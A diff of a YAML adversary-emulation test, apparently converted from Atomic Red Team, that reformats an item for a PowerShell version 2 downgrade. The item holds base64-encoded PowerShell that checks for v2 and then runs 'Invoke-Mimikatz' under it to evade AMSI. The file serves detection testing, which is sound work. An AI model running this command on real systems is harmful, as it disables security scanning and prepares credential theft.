@@ -1,16 +1,15 @@
-- id: 2438241c-fdc3-502c-9c0c-aea4304cc3ef
+- requirements: []
   name: Soumaia ART Tests - PowerShell Version 2 Downgrade
   description: Executes outdated PowerShell Version 2 which does not support security features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz whether it exists or not, as this cmdlet will be blocked by AMSI when active.
   tactic: defense-impairment
-  technique:
-    attack_id: T1689
-    name: Downgrade Attack
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand JAB2ADIAXwBpAG4AcwB0AGEAbABsAGUAZAAgAD0AIABQAG8AdwBlAHIAUwBoAGUAbABsACAALQB2AGUAcgBzAGkAbwBuACAAMgAgAC0AYwBvAG0AbQBhAG4AZAAgACcAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAnAAoAaQBmACAAKAAtAG4AbwB0ACAAJAB2ADIAXwBpAG4AcwB0AGEAbABsAGUAZAApACAAewBlAHgAaQB0ACAAMQB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADAAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand ZQBjAGgAbwAgACIATQBhAG4AdQBhAGwAbAB5ACAAaQBuAHMAdABhAGwAbAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABWAGUAcgBzAGkAbwBuACAAMgAiAAoA
-          }
-          PowerShell -version 2 -command 'Invoke-Mimikatz'
+  technique_id: T1689
+  technique_name: Downgrade Attack
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand JAB2ADIAXwBpAG4AcwB0AGEAbABsAGUAZAAgAD0AIABQAG8AdwBlAHIAUwBoAGUAbABsACAALQB2AGUAcgBzAGkAbwBuACAAMgAgAC0AYwBvAG0AbQBhAG4AZAAgACcAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAnAAoAaQBmACAAKAAtAG4AbwB0ACAAJAB2ADIAXwBpAG4AcwB0AGEAbABsAGUAZAApACAAewBlAHgAaQB0ACAAMQB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADAAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand ZQBjAGgAbwAgACIATQBhAG4AdQBhAGwAbAB5ACAAaQBuAHMAdABhAGwAbAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABWAGUAcgBzAGkAbwBuACAAMgAiAAoA }; PowerShell -version 2 -command 'Invoke-Mimikatz'
+  id: 2438241c-fdc3-502c-9c0c-aea4304cc3ef
